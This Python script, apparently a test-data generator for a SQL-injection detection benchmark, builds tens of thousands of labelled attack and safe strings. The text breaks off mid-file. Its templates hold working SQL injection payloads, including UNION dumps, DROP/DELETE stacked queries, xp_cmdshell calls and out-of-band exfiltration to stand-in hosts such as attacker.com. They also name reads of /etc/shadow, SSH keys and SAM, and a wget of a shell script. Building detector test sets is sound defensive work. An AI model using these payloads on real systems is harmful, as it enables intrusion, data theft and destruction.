"""
Massive Test Dataset Generator for VDCNN Benchmark.

Generates 100,000+ labeled test samples across 14 injection categories
and 10 safe input categories. These samples are designed to be DISTINCT
from the training data to properly evaluate generalization.

Usage:
    python tests/generate_massive_test.py
    # Output: data/massive_test_100k.csv

Categories (Injection ~50,000):
    1. Boolean-based       6,000
    2. UNION-based          5,000
    3. Time-based blind     4,000
    4. Stacked queries      5,000
    5. Error-based          3,000
    6. Comment truncation   3,000
    7. Out-of-band          2,000
    8. OS command            2,000
    9. Stored procedures     2,000
   10. Second-order          2,000
   11. Advanced blind        3,000
   12. Schema enumeration    2,000
   13. Polyglot              1,000
   14. Obfuscated (all)     10,000

Categories (Safe ~50,000):
    1. Names (incl. apostrophes)   8,000
    2. Emails                      5,000
    3. IDs/UUIDs/dates/IPs         5,000
    4. SQL-keywords in text        8,000
    5. JSON/API tokens             4,000
    6. URLs/paths                  4,000
    7. Quotes (contractions)       4,000
    8. Edge cases (unicode, HTML)  4,000
    9. NoSQL/LDAP/XPath            4,000
   10. Code snippets               4,000
"""

import csv
import random
import string
import uuid
import hashlib
import time
import sys
from pathlib import Path
from typing import List, Tuple

# Seed for reproducibility — different from training seed (42)
random.seed(2024)

PROJECT_ROOT = Path(__file__).parent.parent
OUTPUT_DIR = PROJECT_ROOT / "data"
OUTPUT_FILE = OUTPUT_DIR / "massive_test_100k.csv"


# ═══════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

TABLES = [
    'users', 'accounts', 'admin', 'credentials', 'passwords',
    'members', 'employees', 'customers', 'orders', 'products',
    'sessions', 'tokens', 'permissions', 'roles', 'logs',
    'payments', 'transactions', 'profiles', 'settings', 'configs',
    'user_data', 'auth_tokens', 'api_keys', 'audit_log', 'credit_cards',
    'sys_users', 'login_history', 'user_sessions', 'backup_data',
    'temp_data', 'test_table', 'schema_info', 'user_roles', 'access_log',
]

COLUMNS = [
    'username', 'password', 'email', 'id', 'name', 'credit_card',
    'ssn', 'phone', 'address', 'token', 'secret', 'hash',
    'salt', 'role', 'status', 'created_at', 'ip_address',
    'login_count', 'last_login', 'api_key', 'session_id',
    'user_agent', 'referer', 'country', 'balance', 'is_admin',
]

DB_FUNCTIONS = [
    'version()', 'database()', 'user()', 'current_user()',
    '@@version', '@@hostname', '@@datadir', '@@basedir',
    'schema()', '@@global.version_compile_os',
    'system_user()', 'session_user()', '@@version_comment',
]


def rand_table():
    return random.choice(TABLES)


def rand_column():
    return random.choice(COLUMNS)


def rand_int(lo=1, hi=100):
    return random.randint(lo, hi)


def rand_str(length=5):
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def rand_alnum(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def rand_hex(length=8):
    return ''.join(random.choices('0123456789abcdef', k=length))


def rand_comment():
    return random.choice([
        '--', '#', '/*', '-- -', '--+', '-- ', '#!', '/**/',
        '--\t', '-- comment', '#end', '/*end*/',
    ])


def rand_space():
    return random.choice([' ', '  ', '\t', ' \t ', '%20', '+', '%09'])


def rand_case(s: str) -> str:
    return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)


def url_encode_partial(s: str, fraction: float = 0.3) -> str:
    result = []
    for ch in s:
        if random.random() < fraction and ch.isascii() and not ch.isalnum():
            result.append(f'%{ord(ch):02X}')
        else:
            result.append(ch)
    return ''.join(result)


def insert_comments(s: str) -> str:
    words = s.split()
    result = []
    for i, w in enumerate(words):
        result.append(w)
        if i < len(words) - 1 and random.random() > 0.5:
            result.append('/**/')
        else:
            result.append(' ')
    return ''.join(result).strip()


def double_url_encode(s: str, fraction: float = 0.3) -> str:
    result = []
    for ch in s:
        if random.random() < fraction and not ch.isalnum():
            result.append(f'%25{ord(ch):02X}')
        else:
            result.append(ch)
    return ''.join(result)


def hex_encode_str(s: str) -> str:
    return '0x' + s.encode().hex()


def char_encode(s: str) -> str:
    """Encode string using CHAR() function."""
    return 'CHAR(' + ','.join(str(ord(c)) for c in s) + ')'


# Random prefix that mimics user input before injection
_NAMES = [
    'admin', 'user', 'test', 'guest', 'root', 'john', 'jane', 'bob',
    'alice', 'mike', 'sarah', 'david', 'emma', 'alex', 'chris',
    'operator', 'demo', 'support', 'system', 'backup',
]


def rand_prefix():
    prefixes = [
        '', '', '', '',
        str(rand_int(1, 99999)),
        random.choice(_NAMES),
        rand_str(random.randint(3, 8)),
        f"id={rand_int(1, 999)}&name=",
        f"{rand_int(1, 100)}",
        f"{rand_str(3)}@{rand_str(4)}.com",
    ]
    return random.choice(prefixes)


# ═══════════════════════════════════════════════════════════════════
# SQL INJECTION GENERATORS — 14 CATEGORIES
# ═══════════════════════════════════════════════════════════════════

def gen_boolean_based(n: int) -> List[Tuple[str, str]]:
    """Boolean-based injections (6,000)."""
    samples = set()

    while len(samples) < n:
        v = rand_str(random.randint(1, 8))
        c = rand_comment()
        num = rand_int(1, 9999)
        prefix = rand_prefix()
        sp = rand_space()
        op = random.choice(['OR', 'or', 'Or', 'oR', '||', 'OR '])
        and_op = random.choice(['AND', 'and', 'And', '&&', 'AND '])

        templates = [
            f"{prefix}'{sp}{op}{sp}'{v}'='{v}",
            f"{prefix}'{sp}{op}{sp}'1'='1",
            f"{prefix}'{sp}{and_op}{sp}'1'='1",
            f"{prefix}' {op} 1=1{c}",
            f"{prefix}' {op} {num}={num}{c}",
            f"{prefix}' {op} '{v}'='{v}'{c}",
            f"\"{prefix}\" {op} \"1\"=\"1",
            f"{prefix}') {op} ('1'='1",
            f"{prefix}') {op} ('{v}'='{v}",
            f"{prefix}' {op} 1=1 {op} ''='",
            f"\" {op} 1=1{c}",
            f"1 {op} 1=1",
            f"{prefix}' {op} true{c}",
            f"{prefix}' {op} 1{c}",
            f"{prefix}' {op} 1=1 LIMIT {rand_int(1, 20)}{c}",
            f"{prefix}' {op} 1=1 ORDER BY {rand_int(1, 15)}{c}",
            f"{prefix}' {op} 1 LIKE 1{c}",
            f"{prefix}' {op} {num} IN ({num}){c}",
            f"{prefix}' {op} {num} BETWEEN {num-1} AND {num+1}{c}",
            f"{prefix}' {op} ''='",
            f"{prefix}'%20{op}%20'1'%3D'1",
            f"{prefix}' {op} {num}={num} {and_op} '{v}'='{v}'{c}",
            # New patterns not in training
            f"{prefix}' {op} NOT 0{c}",
            f"{prefix}' {op} 0x1=0x1{c}",
            f"{prefix}' {op} ISNULL(NULL){c}",
            f"{prefix}' {op} 'x' REGEXP 'x'{c}",
            f"{prefix}' {op} 'x' LIKE 'x'{c}",
            f"{prefix}' {op} STRCMP('a','a')=0{c}",
            f"{prefix}' {op} LENGTH('{v}')>0{c}",
            f"{prefix}' {op} ASCII('a')=97{c}",
            f"{prefix}' {op} IFNULL(NULL,1)=1{c}",
            f"{prefix}' {op} COALESCE(NULL,1)=1{c}",
            f"{prefix}' WHERE 1=1 {op} 1=1{c}",
            f"{prefix}' HAVING 1=1{c}",
            f"{prefix}' GROUP BY {rand_column()} HAVING 1=1{c}",
            f"{prefix}' {op} EXISTS(SELECT 1){c}",
            f"{prefix}' {op} (SELECT 1)=1{c}",
            f"{prefix}' {op} CHAR(49)=CHAR(49){c}",
        ]

        s = random.choice(templates)

        if random.random() < 0.2:
            s = rand_case(s)
        if random.random() < 0.15:
            s = url_encode_partial(s)

        samples.add(s)

    return [(s, 'boolean_based') for s in list(samples)[:n]]


def gen_union_based(n: int) -> List[Tuple[str, str]]:
    """UNION-based injections (5,000)."""
    samples = set()

    while len(samples) < n:
        num_cols = random.randint(1, 12)
        nulls = ','.join(['NULL'] * num_cols)
        nums = ','.join([str(i + 1) for i in range(num_cols)])
        table = rand_table()
        col1 = rand_column()
        col2 = rand_column()
        c = rand_comment()
        prefix = rand_prefix()
        union_kw = random.choice([
            'UNION', 'union', 'Union', 'UNION ALL', 'union all',
            'UNION SELECT', 'UnIoN SeLeCt', 'UNION DISTINCT',
        ])
        # Ensure union_kw ends properly for templates
        select_kw = '' if 'SELECT' in union_kw.upper() or 'SeLeCt' in union_kw else ' SELECT '
        full_union = union_kw + select_kw

        templates = [
            f"{prefix}' {full_union}{nulls}{c}",
            f"{prefix}' {full_union}{col1},{col2} FROM {table}{c}",
            f"{prefix}') {full_union}{nulls}{c}",
            f"{prefix}' {full_union}{col1},NULL FROM {table}{c}",
            f"{rand_int(-100, 0)} {full_union}{nulls}",
            f"{prefix}' {full_union}{nums}{c}",
            f"{prefix}' {full_union}CONCAT({col1},0x3a,{col2}) FROM {table}{c}",
            f"{prefix}' {full_union}GROUP_CONCAT({col1}) FROM {table}{c}",
            f"{prefix}' {full_union}{col1} FROM information_schema.tables{c}",
            f"{prefix}' {full_union}table_name FROM information_schema.tables WHERE table_schema=database(){c}",
            f"{prefix}' {full_union}column_name FROM information_schema.columns WHERE table_name='{table}'{c}",
            f"{prefix}' {full_union}{col1} FROM {table} LIMIT {rand_int(1, 10)}{c}",
            f"{prefix}' {full_union}{col1},{col2},NULL FROM {table}{c}",
            # New patterns
            f"{prefix}' {full_union}@@version,NULL{c}",
            f"{prefix}' {full_union}LOAD_FILE('/etc/passwd'),NULL{c}",
            f"{prefix}' {full_union}0x{rand_hex(8)},NULL{c}",
            f"{prefix}' {full_union}CONCAT(0x7e,version(),0x7e),NULL{c}",
            f"{prefix}' {full_union}schema_name FROM information_schema.schemata{c}",
            f"{prefix}' ORDER BY {rand_int(1, 20)}{c}",
            f"-{rand_int(1, 999)} {full_union}{nums}{c}",
            f"0 {full_union}{col1},{col2} FROM {table}{c}",
            f"{prefix}' {full_union}ALL {nums}{c}",
        ]

        s = random.choice(templates)

        if random.random() < 0.2:
            s = rand_case(s)
        if random.random() < 0.15:
            s = insert_comments(s)
        if random.random() < 0.1:
            s = url_encode_partial(s)

        samples.add(s)

    return [(s, 'union_based') for s in list(samples)[:n]]


def gen_time_based(n: int) -> List[Tuple[str, str]]:
    """Time-based blind injections (4,000)."""
    samples = set()

    while len(samples) < n:
        delay = random.randint(1, 30)
        c = rand_comment()
        prefix = rand_prefix()
        bench_n = random.randint(100000, 99999999)
        col = rand_column()
        table = rand_table()
        pos = rand_int(1, 20)
        ch = rand_str(1)

        templates = [
            f"{prefix}' AND SLEEP({delay}){c}",
            f"{prefix}' OR SLEEP({delay}){c}",
            f"{prefix}'; WAITFOR DELAY '0:0:{delay}'{c}",
            f"{prefix}' AND BENCHMARK({bench_n},SHA1('{rand_str(4)}')){c}",
            f"{prefix}' AND pg_sleep({delay}){c}",
            f"{prefix}') AND SLEEP({delay}){c}",
            f"{prefix}' AND IF(1=1,SLEEP({delay}),0){c}",
            f"{prefix}' OR IF(1=1,SLEEP({delay}),0){c}",
            f"{prefix}';SELECT SLEEP({delay}){c}",
            f"{prefix}' AND (SELECT SLEEP({delay})){c}",
            f"{prefix}' UNION SELECT SLEEP({delay}){c}",
            f"{rand_int(1, 999)};WAITFOR DELAY '0:0:{delay}'",
            f"{prefix}' AND IF(SUBSTRING(database(),{pos},1)='{ch}',SLEEP({delay}),0){c}",
            f"{prefix}' AND (SELECT {delay} FROM (SELECT(SLEEP({delay})))x){c}",
            # New patterns
            f"{prefix}' AND IF(SUBSTR({col},{pos},1)='{ch}',SLEEP({delay}),0){c}",
            f"{prefix}' AND IF(ORD(MID(({random.choice(DB_FUNCTIONS)}),{pos},1))>{rand_int(32, 126)},SLEEP({delay}),0){c}",
            f"{prefix}';SELECT pg_sleep({delay}){c}",
            f"{prefix}' AND (SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END){c}",
            f"{prefix}' AND SLEEP({delay}) AND '{rand_str(2)}'='{rand_str(2)}",
            f"{prefix}' AND IF(ASCII(SUBSTR(({random.choice(DB_FUNCTIONS)}),{pos},1))>{rand_int(32,126)},BENCHMARK({bench_n},SHA1('x')),0){c}",
            f"{prefix}';BEGIN WAITFOR DELAY '0:0:{delay}' END{c}",
            f"{prefix}' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}){c}",
            f"{prefix}' OR BENCHMARK({bench_n},MD5('{rand_str(3)}')){c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        samples.add(s)

    return [(s, 'time_based') for s in list(samples)[:n]]


def gen_stacked_queries(n: int) -> List[Tuple[str, str]]:
    """Stacked query injections (5,000)."""
    samples = set()

    while len(samples) < n:
        table = rand_table()
        table2 = rand_table()
        col = rand_column()
        col2 = rand_column()
        val = rand_str(random.randint(3, 10))
        c = rand_comment()
        prefix = rand_prefix()
        new_table = rand_str(random.randint(3, 8))

        templates = [
            f"{prefix}'; DROP TABLE {table}{c}",
            f"{prefix}'; DROP TABLE IF EXISTS {table}{c}",
            f"{prefix}'; DELETE FROM {table}{c}",
            f"{prefix}'; DELETE FROM {table} WHERE {col}='{val}'{c}",
            f"{prefix}'; DELETE FROM {table} WHERE 1=1{c}",
            f"{prefix}'; UPDATE {table} SET {col}='{val}'{c}",
            f"{prefix}'; UPDATE {table} SET {col}='{val}' WHERE {col2}={rand_int(1, 100)}{c}",
            f"{prefix}'; INSERT INTO {table} VALUES('{val}','{rand_str(5)}'){c}",
            f"{prefix}'; INSERT INTO {table}({col}) VALUES('{val}'){c}",
            f"{prefix}'; TRUNCATE TABLE {table}{c}",
            f"{prefix}'; ALTER TABLE {table} DROP COLUMN {col}{c}",
            f"{prefix}'; ALTER TABLE {table} ADD {rand_str(4)} VARCHAR(255){c}",
            f"{prefix}'; CREATE TABLE {new_table}(id INT, {col} VARCHAR(255)){c}",
            f"{prefix}'; SHUTDOWN{c}",
            f"{rand_int(1, 999)}; DROP TABLE {table}",
            f"{prefix}'; INSERT INTO {table}({col}) SELECT {col2} FROM {table2}{c}",
            f"{prefix}'; GRANT ALL ON {table} TO '{rand_str(5)}'{c}",
            f"{prefix}'; REVOKE ALL ON {table} FROM '{rand_str(5)}'{c}",
            f"{prefix}'; EXEC sp_executesql N'SELECT * FROM {table}'{c}",
            # New patterns
            f"{prefix}'; RENAME TABLE {table} TO {new_table}{c}",
            f"{prefix}'; CREATE USER '{rand_str(5)}'@'%' IDENTIFIED BY '{rand_str(8)}'{c}",
            f"{prefix}'; DROP DATABASE IF EXISTS {rand_str(6)}{c}",
            f"{prefix}'; FLUSH PRIVILEGES{c}",
            f"{prefix}'; SET GLOBAL max_connections = 1{c}",
            f"{prefix}'; ALTER USER '{rand_str(5)}'@'localhost' IDENTIFIED BY '{rand_str(10)}'{c}",
            f"{prefix}'; KILL {rand_int(1, 999)}{c}",
            f"{prefix}'; LOAD DATA INFILE '/etc/passwd' INTO TABLE {table}{c}",
            f"{prefix}'; SELECT * INTO OUTFILE '/tmp/{rand_str(5)}.txt' FROM {table}{c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        if random.random() < 0.1:
            s = url_encode_partial(s)
        samples.add(s)

    return [(s, 'stacked_queries') for s in list(samples)[:n]]


def gen_error_based(n: int) -> List[Tuple[str, str]]:
    """Error-based injections (3,000)."""
    samples = set()

    while len(samples) < n:
        c = rand_comment()
        func = random.choice(DB_FUNCTIONS)
        prefix = rand_prefix()
        hex_delim = random.choice(['0x7e', '0x3a', '0x2d', '0x7c'])
        table = rand_table()
        col = rand_column()

        templates = [
            f"{prefix}' AND EXTRACTVALUE(1,CONCAT({hex_delim},{func})){c}",
            f"{prefix}' AND UPDATEXML(1,CONCAT({hex_delim},{func}),1){c}",
            f"{prefix}' AND EXP(~(SELECT * FROM (SELECT {func})x)){c}",
            f"{prefix}' AND JSON_KEYS((SELECT CONVERT((SELECT {func}) USING utf8))){c}",
            f"{prefix}' AND GTID_SUBSET(CONCAT({hex_delim},{func}),1){c}",
            f"{prefix}' AND ROW(1,1)>(SELECT COUNT(*),CONCAT({func},FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x){c}",
            f"{prefix}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT({func},FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a){c}",
            f"{rand_int(1, 999)} AND EXTRACTVALUE(1,CONCAT({hex_delim},{func})){c}",
            f"{prefix}' OR EXTRACTVALUE(1,CONCAT({hex_delim},{func})){c}",
            f"{prefix}') AND UPDATEXML(1,CONCAT({hex_delim},{func}),1){c}",
            # New patterns
            f"{prefix}' AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT {func})a)b)){c}",
            f"{prefix}' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x){c}",
            f"{prefix}' AND ST_LatFromGeoHash(version()){c}",
            f"{prefix}' AND ST_LongFromGeoHash(version()){c}",
            f"{prefix}' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT {func})a)b)){c}",
            f"{prefix}' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT({hex_delim},{func},{hex_delim},0x716b7a71))s),8446744073709551610,8446744073709551610))){c}",
            f"{prefix}' AND multipoint((select * from(select * from(select {func})a)b)){c}",
            f"{prefix}' AND linestring((select * from(select * from(select {func})a)b)){c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        samples.add(s)

    return [(s, 'error_based') for s in list(samples)[:n]]


def gen_comment_truncation(n: int) -> List[Tuple[str, str]]:
    """Comment truncation payloads (3,000)."""
    samples = set()

    usernames = [
        'admin', 'root', 'administrator', 'sa', 'dba', 'test', 'user',
        'sysadmin', 'operator', 'guest', 'support', 'manager', 'backup',
        'webadmin', 'postgres', 'mysql', 'oracle', 'mssql', 'dbadmin',
    ]

    while len(samples) < n:
        user = random.choice(usernames)
        c = rand_comment()
        extra = rand_str(random.randint(0, 5))
        col = rand_column()

        templates = [
            f"{user}'{c}",
            f"{user}' {c}",
            f"{user}'/*{extra}*/",
            f"{user}' OR ''='",
            f"' {c}",
            f"') {c}",
            f"\") {c}",
            f"{user}' AND 1=1{c}",
            f"{user}' AND '{extra}'='{extra}",
            f"{user}{extra}'{c}",
            f"'{c} {extra}",
            f"{user}'/**/--",
            # New patterns
            f"{user}'-- -",
            f"{user}'#",
            f"{user}'/*",
            f"{user}' /*!50000AND*/ 1=1{c}",
            f"{user}';{c}",
            f"{user}' OR 1=1 LIMIT 1{c}",
            f"{user}' OR 1=1 LIMIT 1,1{c}",
            f"' OR '{user}'='{user}",
            f"{user}' /**/OR/**/1=1{c}",
            f"{user}'%00",
            f"{user}' OR ''='{c}",
        ]

        s = random.choice(templates)
        samples.add(s)

    return [(s, 'comment_truncation') for s in list(samples)[:n]]


def gen_out_of_band(n: int) -> List[Tuple[str, str]]:
    """Out-of-band (OOB) exfiltration payloads (2,000)."""
    samples = set()

    domains = [
        f'{rand_str(5)}.attacker.com', f'{rand_str(6)}.evil.net',
        f'{rand_str(4)}.exfil.xyz', f'oob.{rand_str(5)}.com',
        f'{rand_str(7)}.burpcollaborator.net', f'{rand_str(5)}.dnsbin.io',
    ]

    while len(samples) < n:
        domain = random.choice(domains)
        c = rand_comment()
        prefix = rand_prefix()
        func = random.choice(DB_FUNCTIONS)
        table = rand_table()
        col = rand_column()

        templates = [
            f"{prefix}' AND LOAD_FILE(CONCAT('\\\\\\\\',({func}),'.{domain}\\\\a')){c}",
            f"{prefix}'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.{domain}\\\\x')){c}",
            f"{prefix}' AND UTL_HTTP.REQUEST('http://{domain}/'||{col}){c}",
            f"{prefix}' AND UTL_INADDR.GET_HOST_ADDRESS('{domain}'){c}",
            f"{prefix}' AND (SELECT UTL_HTTP.REQUEST('http://{domain}/'||{func}) FROM dual){c}",
            f"{prefix}'; EXEC master..xp_dirtree '\\\\{domain}\\share'{c}",
            f"{prefix}'; EXEC master..xp_fileexist '\\\\{domain}\\share\\file'{c}",
            f"{prefix}' AND extractvalue(1,concat(0x7e,(SELECT LOAD_FILE(concat('\\\\\\\\',{func},'.{domain}\\\\'))),0x7e)){c}",
            f"{prefix}'; DECLARE @q VARCHAR(1024); SET @q='\\\\{domain}\\'+(SELECT {col} FROM {table}); EXEC master..xp_dirtree @q{c}",
            f"{prefix}'; COPY (SELECT {col} FROM {table}) TO PROGRAM 'nslookup '||{col}||'.{domain}'{c}",
            f"{prefix}' AND DBMS_LDAP.INIT('{domain}',389){c}",
            f"{prefix}' AND httpuritype('http://{domain}/'||{func}).getclob(){c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.1:
            s = rand_case(s)
        samples.add(s)

    return [(s, 'out_of_band') for s in list(samples)[:n]]


def gen_os_command(n: int) -> List[Tuple[str, str]]:
    """OS command injection through SQL (2,000)."""
    samples = set()

    cmds = [
        'dir', 'ls', 'ls -la', 'whoami', 'cat /etc/passwd', 'net user',
        'ipconfig', 'ifconfig', 'id', 'uname -a', 'type C:\\boot.ini',
        'ping attacker.com', 'nslookup attacker.com', 'curl http://attacker.com',
        'wget http://attacker.com/shell.sh', 'cat /etc/shadow', 'ps aux',
        'netstat -an', 'hostname', 'pwd', 'env', 'set', 'systeminfo',
    ]
    paths = [
        '/etc/passwd', '/etc/shadow', '/etc/hosts', '/var/log/auth.log',
        '/proc/self/environ', '/root/.ssh/id_rsa', '/tmp/dump.txt',
        'C:\\Windows\\System32\\config\\SAM', 'C:\\boot.ini',
        '/proc/version', '/etc/crontab', '/var/log/syslog',
    ]

    while len(samples) < n:
        c = rand_comment()
        cmd = random.choice(cmds)
        path = random.choice(paths)
        domain = f'{rand_str(5)}.com'
        prefix = rand_prefix()
        col = rand_column()

        templates = [
            f"{prefix}'; EXEC xp_cmdshell('{cmd}'){c}",
            f"{prefix}'; EXEC master..xp_cmdshell '{cmd}'{c}",
            f"{prefix}' AND LOAD_FILE('{path}'){c}",
            f"{prefix}' INTO OUTFILE '{path}'{c}",
            f"{prefix}' INTO DUMPFILE '/tmp/{rand_str(5)}.bin'{c}",
            f"{prefix}'; EXEC xp_dirtree '\\\\{domain}\\share'{c}",
            f"{prefix}' UNION SELECT LOAD_FILE('{path}'){c}",
            f"{prefix}'; sp_configure 'xp_cmdshell',1; RECONFIGURE{c}",
            f"{prefix}' AND UTL_HTTP.REQUEST('http://{domain}/'||{col}){c}",
            f"{prefix}' AND UTL_INADDR.GET_HOST_ADDRESS('{domain}'){c}",
            f"{prefix}' UNION SELECT LOAD_FILE(CONCAT('/tmp/',{col})){c}",
            # New patterns
            f"{prefix}'; EXEC xp_regread 'HKLM','SOFTWARE\\Microsoft\\MSSQLSERVER'{c}",
            f"{prefix}'; EXEC sp_OACreate 'WScript.Shell'{c}",
            f"{prefix}'; COPY {rand_table()} TO '/tmp/{rand_str(5)}.csv' DELIMITER ','{c}",
            f"{prefix}' UNION SELECT pg_read_file('{path}',0,1000){c}",
            f"{prefix}'; CREATE EXTENSION IF NOT EXISTS dblink{c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.1:
            s = rand_case(s)
        samples.add(s)

    return [(s, 'os_command') for s in list(samples)[:n]]


def gen_stored_procedures(n: int) -> List[Tuple[str, str]]:
    """Stored procedure abuse (2,000)."""
    samples = set()

    while len(samples) < n:
        c = rand_comment()
        prefix = rand_prefix()
        table = rand_table()
        col = rand_column()
        val = rand_str(random.randint(3, 8))
        db = rand_str(random.randint(3, 7))
        user = random.choice(_NAMES)
        delay = rand_int(1, 15)

        templates = [
            f"{prefix}'; EXEC sp_executesql N'SELECT * FROM {table}'{c}",
            f"{prefix}'; EXEC sp_makewebtask 'http://{rand_str(5)}.com/{rand_str(3)}', 'SELECT * FROM {table}'{c}",
            f"{prefix}'; EXEC xp_regwrite 'HKLM','SOFTWARE\\{val}','key','REG_SZ','{val}'{c}",
            f"{prefix}'; EXEC xp_servicecontrol 'start', '{val}'{c}",
            f"{prefix}'; EXEC sp_addextendedproc '{val}', '{val}.dll'{c}",
            f"{prefix}'; EXEC sp_addlogin '{user}', '{val}'{c}",
            f"{prefix}'; EXEC sp_addsrvrolemember '{user}', 'sysadmin'{c}",
            f"{prefix}'; EXEC sp_password '{val}', '{rand_str(10)}', '{user}'{c}",
            f"{prefix}'; EXEC master..xp_cmdshell 'whoami'{c}",
            f"{prefix}'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE{c}",
            f"{prefix}'; CALL {rand_str(5)}('{val}','{rand_str(3)}'){c}",
            f"{prefix}'; CALL sys.sleep({delay}){c}",
            f"{prefix}'; DO SLEEP({delay}){c}",
            f"{prefix}'; BEGIN EXEC sp_executesql N'DROP TABLE {table}'; END{c}",
            f"{prefix}'; DECLARE @cmd NVARCHAR(4000); SET @cmd=N'SELECT * FROM {table}'; EXEC sp_executesql @cmd{c}",
            f"{prefix}'; EXEC sp_helpdb '{db}'{c}",
            f"{prefix}'; EXEC sp_who{c}",
            f"{prefix}'; EXEC sp_tables @table_owner='dbo'{c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.1:
            s = rand_case(s)
        samples.add(s)

    return [(s, 'stored_procedures') for s in list(samples)[:n]]


def gen_second_order(n: int) -> List[Tuple[str, str]]:
    """Second-order injection payloads (2,000).

    These are stored first, then executed in another context.
    """
    samples = set()

    while len(samples) < n:
        c = rand_comment()
        prefix = rand_prefix()
        table = rand_table()
        col = rand_column()
        val = rand_str(random.randint(3, 8))
        user = random.choice(_NAMES)

        templates = [
            # Username-based second order
            f"admin' OR '1'='1",
            f"admin'-- ",
            f"admin' AND 1=1{c}",
            f"' OR 1=1{c}",
            f"admin' UNION SELECT {col} FROM {table}{c}",
            f"{user}' OR 'x'='x",
            f"{user}'; UPDATE {table} SET {col}='{val}'{c}",
            f"test'||SLEEP(5)||'",
            f"{val}'; DROP TABLE {table}{c}",
            f"admin'||(SELECT password FROM users LIMIT 1)||'",
            # Profile/form field second order
            f"Robert'); DROP TABLE {table}{c}",
            f"<script>'; DROP TABLE {table}{c}",
            f"{user}',(SELECT {col} FROM {table}),'{val}",
            f"x' UNION SELECT 1,{col},3 FROM {table}{c}",
            f"' + (SELECT TOP 1 {col} FROM {table}) + '",
            # Stored values that become injections
            f"${{{rand_str(4)}}}'; DELETE FROM {table}{c}",
            f"{{{{val}}}}'; EXEC xp_cmdshell('whoami'){c}",
            f"%s'; DROP TABLE {table}{c}",
            f"\\'; DELETE FROM {table}{c}",
            f"admin' WAITFOR DELAY '0:0:5'{c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        samples.add(s)

    return [(s, 'second_order') for s in list(samples)[:n]]


def gen_advanced_blind(n: int) -> List[Tuple[str, str]]:
    """Advanced blind SQL injection (3,000)."""
    samples = set()

    while len(samples) < n:
        c = rand_comment()
        prefix = rand_prefix()
        table = rand_table()
        col = rand_column()
        pos = rand_int(1, 30)
        val = rand_int(32, 126)
        ch = chr(random.randint(32, 126))
        func = random.choice(DB_FUNCTIONS)
        delay = rand_int(1, 15)

        templates = [
            # Substring-based blind
            f"{prefix}' AND SUBSTRING({func},{pos},1)='{ch}'{c}",
            f"{prefix}' AND ASCII(SUBSTRING({func},{pos},1))>{val}{c}",
            f"{prefix}' AND ASCII(MID({func},{pos},1))>{val}{c}",
            f"{prefix}' AND ORD(MID({func},{pos},1))>{val}{c}",
            f"{prefix}' AND SUBSTR({func},{pos},1)>'{ch}'{c}",
            # Binary search blind
            f"{prefix}' AND (SELECT ASCII(SUBSTR({col},{pos},1)) FROM {table} LIMIT 1)>{val}{c}",
            f"{prefix}' AND (SELECT SUBSTR({col},{pos},1) FROM {table} LIMIT 1)='{ch}'{c}",
            f"{prefix}' AND (SELECT COUNT(*) FROM {table})>{rand_int(0, 100)}{c}",
            f"{prefix}' AND (SELECT LENGTH({col}) FROM {table} LIMIT 1)>{rand_int(1, 50)}{c}",
            # Conditional blind
            f"{prefix}' AND IF(SUBSTR({func},{pos},1)='{ch}',1,0){c}",
            f"{prefix}' AND CASE WHEN SUBSTR({func},{pos},1)='{ch}' THEN 1 ELSE 0 END{c}",
            f"{prefix}' AND (CASE WHEN (ASCII(SUBSTR(({func}),{pos},1))>{val}) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END){c}",
            # Bitwise blind
            f"{prefix}' AND ASCII(SUBSTR({func},{pos},1))&{2**random.randint(0,7)}={2**random.randint(0,7)}{c}",
            f"{prefix}' AND (ASCII(SUBSTR({func},{pos},1))>>{random.randint(0,7)})&1=1{c}",
            # Error-conditional blind
            f"{prefix}' AND (SELECT IF(SUBSTR({func},{pos},1)='{ch}',(SELECT table_name FROM information_schema.tables),0)){c}",
            f"{prefix}' AND 1=(SELECT IF(ASCII(SUBSTR(({func}),{pos},1))>{val},1,(SELECT 1 FROM information_schema.tables))){c}",
            # HAVING/GROUP blind
            f"{prefix}' GROUP BY {col} HAVING SUBSTR({func},{pos},1)='{ch}'{c}",
            f"{prefix}' HAVING SUBSTR({func},{pos},1)='{ch}'{c}",
        ]

        s = random.choice(templates)
        if random.random() < 0.15:
            s = rand_case(s)
        samples.add(s)

    return [(s, 'advanced_blind') for s in list(samples)[:n]]


def gen_schema_enumeration(n: int) -> List[Tuple[str, str]]:
    """Schema enumeration payloads (2,000)."""
    samples = set()

    while len(samples) < n:
        c = rand_comment()
        prefix = rand_prefix()
        table = rand_table()
        col = rand_column()
        db = rand_str(random.randint(3, 7))

        templates = [
            f"{prefix}' UNION SELECT table_name,NULL FROM information_schema.tables{c}",
            f"{prefix}' UNION SELECT column_name,NULL FROM information_schema.columns{c}",
            f"{prefix}' UNION SELECT schema_name,NULL FROM information_schema.schemata{c}",
            f"{prefix}' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database(){c}",
            f"{prefix}' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>{rand_int(1, 20)}{c}",
